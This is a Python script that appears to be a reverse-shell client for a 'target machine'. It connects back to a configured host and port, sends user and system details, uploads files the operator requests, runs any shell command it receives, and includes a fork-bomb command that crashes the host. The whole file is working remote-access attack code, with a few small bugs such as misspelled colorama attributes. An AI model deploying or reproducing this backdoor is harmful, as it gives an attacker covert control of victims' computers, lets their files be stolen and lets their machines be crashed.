import getpass
import os
import platform
import socket
import subprocess
from time import sleep

import colorama
from colorama import Fore, Style

# Initialize Colorama module
colorama.init()

# Initial variables for remote host/port
# # Change these variables before uploading to target machine
RHOST = "127.0.0.1"
RPORT = 64444

# Initializing socket module and connecting via IPv4 through TCP
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))

# A "while True" loop is a loop that will run forever
while True:
    # We will execute the follow commands until the end or an error
    try:
        # Defines the prefix before typing a command
        # # Below shows the following: username@hostname:/home/username/$
        header = f"""{Fore.Red}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESETALL}$ """
        sock.send(header.encode())
        # STDOUT & STDERR being set to None so commands do not double execute by accident
        STDOUT, STDERR = None, None
        # Receives the command from the server to execute
        cmd = sock.recv(1024).decode("utf-8")

        # List files in the dir
        # # A more reliable `ls` command execution
        if cmd == "list":
            sock.send(str(os.listdir(".")).encode())

        # Forkbomb
        # # A forkbomb is an attack when a process replicates itself over and over again,
        # # causing all system resources to be consumed, usually causing the system to crash.
        # # The "while True" loop infinitely duplicates the python process, causing the
        # # computer to crash.
        if cmd == "forkbomb":
            while True:
                os.fork()
        
        # Change directory
        # # An improved `cd` command execution
        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
            sock.send("Changed directory to {}".format(os.getcwd()).encode())

        # Get system info
        # # Uses a combination of data from the platform module to display host info
        elif cmd == "sysinfo":
            sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """
            sock.send(sysinfo.encode())

        # Download files
        # # Downloads any file you want as you are traversing directories
        elif cmd.split(" ")[0] == "download":
            with open(cmd.split(" ")[1], "rb") as f:
                file_data = f.read(1024)
                while file_data:
                    print("Sending", file_data)
                    sock.send(file_data)
                    file_data = f.read(1024)
                sleep(2)
                sock.send(b"Done")
            print("Finished sending data")
        
        # Terminate the connection
        elif cmd == "exit":
            sock.send(b"exit")
            break
        
        # Run any other command
        # # Is a command not above? We can handle those, too!
        else:
            comm = subprocess.Popen(
                str(cmd),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            STDOUT, STDERR = comm.communicate()
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)

        # If the connection terminates
        if not cmd:
            print("Connection dropped")
            break

    except Exception as e:
        sock.send("An error has occurred: {}".format(str(e)).encode())

sock.close()